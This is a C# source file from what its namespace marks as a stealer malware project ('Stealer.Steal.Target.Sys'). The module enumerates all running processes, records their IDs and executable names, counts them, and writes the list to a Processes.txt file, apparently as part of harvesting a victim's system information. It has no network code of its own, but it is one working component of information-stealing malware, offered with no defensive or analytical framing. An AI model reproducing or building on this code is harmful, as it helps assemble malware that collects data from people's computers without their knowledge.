using System.Collections.Generic;
using System.IO;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Sys;

internal class Processes
{
	public static void Start()
	{
		List<string> list = new List<string>();
		list.Add("ProcessID\tName");
		ProcessDump.PROCESSENTRY32[] array = ProcessDump.Dump();
		for (int i = 0; i < array.Length; i++)
		{
			ProcessDump.PROCESSENTRY32 pROCESSENTRY = array[i];
			try
			{
				uint th32ProcessID = pROCESSENTRY.th32ProcessID;
				list.Add(th32ProcessID + "  " + pROCESSENTRY.szExeFile);
				Counter.CountProcess++;
			}
			catch
			{
			}
		}
		DynamicFiles.WriteAllText(Path.Combine("Processes.txt"), string.Join("\n", (IEnumerable<string?>)list.ToArray()));
	}
}
